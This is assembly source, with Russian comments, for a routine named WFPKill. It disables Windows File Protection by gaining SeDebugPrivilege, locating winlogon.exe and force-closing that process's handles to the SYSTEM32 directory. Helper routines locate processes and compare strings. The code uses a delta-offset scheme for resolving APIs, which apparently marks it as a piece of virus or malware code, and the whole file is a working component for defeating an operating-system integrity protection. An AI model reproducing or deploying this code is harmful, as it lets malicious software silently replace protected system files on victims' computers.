UNICODE_STRING STRUCT
	woLength		WORD	0	; len of string in bytes (not chars)
	MaximumLength	WORD	0		; len of Buffer in bytes (not chars)
	Buffer			DWORD	0	; pointer to string
UNICODE_STRING ENDS
STATUS_INFO_LENGTH_MISMATCH equ 0C0000004h
System_Handle_Information struct
	nHandleEntries DWORD ?
	pHandleInfo DWORD ?
System_Handle_Information ends
Handle_Info struct
	Pid DWORD ?
	ObjectType WORD ?
	HandleValue WORD ?
	ObjectPointer DWORD ?
	AccessMask DWORD ?	
Handle_Info ends

;===============================================================================;
;Процедура WFPKill
;Отключение WFP
;Вход: Delta - дельта-смещение
;Выход: 1 - функция выполнена устпешно, 0 - недостаточно прав для этой операции или неизвестная ошибка
;===============================================================================;
WFPKill proc Delta:DWORD
LOCAL _NtQuerySystemInformation:DWORD
LOCAL _NtQueryObject:DWORD
LOCAL WinLogon_Id:DWORD
LOCAL hWinlogon:DWORD
LOCAL SizeBuffer:DWORD
LOCAL pSystemHandleInfo:DWORD
LOCAL uBuff:DWORD
LOCAL BufferWFP:DWORD
LOCAL hCopy:DWORD
LOCAL Buffer:DWORD
jmp WFPKillCode
	winlogon_str	db	"winlogon.exe",0
	ntdll		db	"NTDLL.DLL",0
	FuncName	db 	"NtQuerySystemInformation",0
	FuncName2 	db 	"NtQueryObject",0
	WinDir1 dw "W","I","N","D","O","W","S","\","S","Y","S","T","E","M","3","2",0
	WinDir2 dw "W","I","N","N","T","\","S","Y","S","T","E","M","3","2",0
WFPKillCode:
	startproc
;Теперь у нас отладочные привилегии
	mov ebx,Delta
	push ebx
	call EnableDebugPrivilege
	.if eax==0
		endproc
		mov eax,NULL
		ret
	.endif 

	lea eax,[ebx+ntdll]
	push eax
	apiproc _GetModuleHandleA

	lea esi,[ebx+FuncName]
	push esi
	push eax
	apiproc _GetProcAddress

	mov _NtQuerySystemInformation,eax
	lea eax,[ebx+ntdll]
	push eax
	apiproc _GetModuleHandleA

	lea esi,[ebx+FuncName2]
	push esi
	push eax
	apiproc _GetProcAddress
	
	mov _NtQueryObject,eax
	.if eax==0
		endproc
		mov eax,NULL
		ret
	.endif 
;Получаем описатель процесса Winlogon.exe		
	push ebx
	lea eax,[ebx+winlogon_str]
	push eax
	call GetPIDbyName
	mov WinLogon_Id,eax
	.if eax==0
		endproc
		mov eax,NULL
		ret
	.endif 	
	push eax
	push 0	
	push PROCESS_DUP_HANDLE
	apiproc _OpenProcess
	mov hWinlogon,eax
;Определям размер буфера для получения списка хэндлов		
	lea eax,SizeBuffer
	push eax
	push 0
	push 0
	push 16;SystemHandleInformation
	call _NtQuerySystemInformation
	.if eax!=STATUS_INFO_LENGTH_MISMATCH
		jmp end_calc_size
	.endif
next_calc_size:
	add SizeBuffer,01000h
	.if pSystemHandleInfo!=0
		push MEM_RELEASE
		push 0
		push pSystemHandleInfo
		apiproc _VirtualFree
	.endif
	push PAGE_READWRITE
	push MEM_COMMIT
	push SizeBuffer
	push 0
	apiproc _VirtualAlloc
	.if eax==0
		endproc
		mov eax,NULL
		ret
	.endif 
	mov pSystemHandleInfo,eax
	lea eax,uBuff
	push eax
	push SizeBuffer
	push pSystemHandleInfo
	push 16
	call _NtQuerySystemInformation
	.if eax==STATUS_INFO_LENGTH_MISMATCH
		jmp next_calc_size
	.endif
end_calc_size:
;Получаем все хэндлы и закрываем ненужные			
	push PAGE_READWRITE
	push MEM_COMMIT
	push 300h
	push 0
	apiproc _VirtualAlloc
	.if eax==0
		endproc
		mov eax,NULL
		ret
	.endif 
	mov BufferWFP,eax

	assume edi:ptr System_Handle_Information
	mov edi,pSystemHandleInfo
	mov ecx,[edi].nHandleEntries
	add edi,4
	assume edi:ptr Handle_Info
	mov edx,0
next_handle:
	push ecx
	push edx
	mov eax,[edi].Pid
	.if eax==WinLogon_Id
		apiproc _GetCurrentProcess
		mov edx,eax
		xor eax,eax
		mov ax,[edi].HandleValue
		push DUPLICATE_SAME_ACCESS
		push 0
		push 0
	 	lea esi,hCopy
		push esi
		push edx
		push eax
		push hWinlogon
		apiproc _DuplicateHandle
		.if eax!=0
			push 0
			push 214h;sizeof(ObjName)
			push BufferWFP
			push 1;ObjectNameInformation
			push hCopy
			call _NtQueryObject
			push edi
			.if eax==0;StatusSuccess
				mov edi,BufferWFP
				assume edi:ptr UNICODE_STRING
				mov edi,[edi].Buffer
				push edi
				apiproc _CharUpperW
				mov edi,BufferWFP
				assume edi:ptr UNICODE_STRING
				push ebx
				mov edi,[edi].Buffer
				push edi
				lea eax,[ebx+WinDir1]
				push eax
				call CompareStringBackwards
				.if eax==1 
					jmp Yes1
				.elseif 
					jmp No
				.endif
				mov edi,BufferWFP
				assume edi:ptr UNICODE_STRING
				push ebx
				mov edi,[edi].Buffer
				push edi
				lea eax,[ebx+WinDir2] 
				push eax
				call CompareStringBackwards
				.if eax==1 
					jmp Yes1
				.elseif 
					jmp No
				.endif
Yes1:
				push hCopy
				apiproc _CloseHandle
				pop edi
				assume edi:ptr Handle_Info
				xor eax,eax
				mov ax,[edi].HandleValue
				push DUPLICATE_CLOSE_SOURCE or DUPLICATE_SAME_ACCESS
				push 0
				push 0
				lea esi,hCopy
				push esi
				push -1
				push eax
				push hWinlogon
				apiproc _DuplicateHandle
				push hCopy
				apiproc _CloseHandle
				push edi
			.endif
No:
		pop edi
		.endif
		push hCopy
		apiproc _CloseHandle
	.endif
	pop edx
	pop ecx
	inc edx
	.if edx>=ecx
		push MEM_RELEASE
		push 0
		push pSystemHandleInfo
		apiproc _VirtualFree
		push MEM_RELEASE
		push 0
		push BufferWFP
		apiproc _VirtualFree
		push hWinlogon
		apiproc _CloseHandle
		mov eax,TRUE
		endproc
		ret
	.endif
	add edi,16
	jmp next_handle
WFPKill endp
;===============================================================================;


;===============================================================================;
;Процедура CompareStringBackwards
;Сравнить строки назад
;Вход: не важно, т.к. является вспомогательной функцией
;Выход: не важно, т.к. является вспомогательной функцией
;===============================================================================;
CompareStringBackwards proc pStr1:dword,pStr2:dword,Delta:DWORD
LOCAL Len1:DWORD
LOCAL Len2:DWORD
	startproc
	mov ebx,Delta
	push esi
	push edi
	push pStr1
	apiproc _lstrlenW

	mov Len1,eax
	push pStr2
	apiproc _lstrlenW
	mov Len2,eax
	mov eax,Len1
	.if eax>Len2
		mov eax,0
		pop edi
		pop esi
		endproc
		ret
	.endif
	mov edx,Len1
	add edx,Len1
	mov edi,pStr1
	add edi,edx

	mov edx,Len2
	add edx,Len2
	mov esi,pStr2
	add esi,edx

	mov ecx,Len1
	inc ecx
	std
	repe cmpsw
	add esi,2
	add edi,2
	xor eax,eax
	xor edx,edx
	mov ax,word ptr [esi]
	mov dx,word ptr [edi]
	cld
	.if (ecx==0)&&(eax==edx)
		mov eax,1
		pop edi
		pop esi
		endproc
		ret
	.else
		mov eax,0
		pop edi
		pop esi
		endproc
		ret
	.endif
CompareStringBackwards endp
;===============================================================================;


;===============================================================================;
;Процедура EnableDebugPrivilege
;Получить отладочные привилегии для доступа к системым процессам
;Вход: Delta - дельта-смещение
;Выход:
;	1 - если процесс получил отладочные привилегии, иначе 0.
;===============================================================================;
EnableDebugPrivilege proc Delta:DWORD
LOCAL hToken:DWORD
LOCAL tkp:TOKEN_PRIVILEGES
LOCAL ReturnLength:DWORD
LOCAL luid:LUID
	startproc
	jmp EnableDebugPrivilegeCode
;Строка нужная функции LookupPrivilegeValueA
Priv 			db 	"SeDebugPrivilege",0

EnableDebugPrivilegeCode:
	mov eax,0
	mov ebx,Delta

	lea esi,hToken
	push esi
	push TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY
	push INVALID_HANDLE_VALUE
	apiproc _OpenProcessToken

	lea esi,luid
	push esi
	lea esi,[ebx+Priv]
	push esi
	push NULL
	apiproc _LookupPrivilegeValueA

	.IF eax==0
		push hToken
		apiproc _CloseHandle
		endproc
		mov eax,FALSE
		ret
	.ENDIF

	mov tkp.PrivilegeCount,1
	lea eax,tkp.Privileges
	assume eax:ptr LUID_AND_ATTRIBUTES
	push luid.LowPart
	pop [eax].Luid.LowPart

	push luid.HighPart
	pop [eax].Luid.HighPart

	mov [eax].Attributes,SE_PRIVILEGE_ENABLED

	lea esi,ReturnLength
	push esi
	lea esi,tkp
	push esi
	push sizeof tkp
	lea esi,tkp
	push esi
	push NULL
	push hToken
	apiproc _AdjustTokenPrivileges
	
	apiproc _GetLastError
	.IF eax!=ERROR_SUCCESS
		mov eax,FALSE
		endproc
		ret
	.ENDIF
	push hToken
	apiproc _CloseHandle
	endproc
	mov eax,TRUE
	ret
EnableDebugPrivilege endp
;===============================================================================;


;===============================================================================;
;Процедура GetPIDbyName
;Получить идентификатор процесса по его имени
;Вход:
;	Delta - дельта-смещение
;	Str1 - имя процесса
;Выход:
;	PID процесса 
;===============================================================================;
GetPIDbyName proc Str1:DWORD,Delta:DWORD
LOCAL pe:PROCESSENTRY32
LOCAL hSnap:DWORD
	startproc
	mov ebx,Delta
	push 0
	push TH32CS_SNAPPROCESS
	apiproc _CreateToolhelp32Snapshot
	mov hSnap,eax
	mov pe.dwSize,sizeof pe
	lea eax,pe
	push eax
	push hSnap
	apiproc _Process32First
	.if eax==0
		endproc
		ret
	.endif
next_process:
	lea eax,pe
	push eax
	push hSnap
	apiproc _Process32Next
	.if eax==0
		endproc
		ret
	.endif
	push Str1
	lea eax,pe.szExeFile
	push eax
	apiproc _lstrcmpiA
	.if eax==0
		mov eax,pe.th32ProcessID
		endproc
		ret
	.endif
	jmp next_process
GetPIDbyName endp
;===============================================================================;